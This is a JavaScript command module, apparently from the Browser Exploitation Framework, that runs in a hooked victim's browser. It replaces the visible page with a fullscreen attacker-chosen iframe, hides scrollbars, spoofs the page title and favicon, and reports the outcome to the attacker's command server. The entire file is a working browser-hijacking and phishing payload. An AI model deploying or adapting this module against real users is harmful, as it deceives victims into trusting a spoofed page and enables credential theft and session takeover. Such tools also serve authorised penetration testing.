//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var result = 'Iframe successfully created!';
	var title = '<%= @iframe_title %>';
	var iframe_src = '<%= @iframe_src %>';
	var iframe_favicon = '<%= @iframe_favicon %>';
	var sent = false;

	$j("iframe").remove();
	
	server.dom.createIframe('fullscreen', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; server.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result); } });
	document.body.scroll = "no";
	document.documentElement.style.overflow = 'hidden';
	server.browser.changeFavicon(iframe_favicon);

	setTimeout(function() { 
		if(!sent) {
			result = 'Iframe failed to load, timeout';
			server.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
			document.title = iframe_src + " is not available";
			sent = true;
		}
	}, <%= @iframe_timeout %>);

});
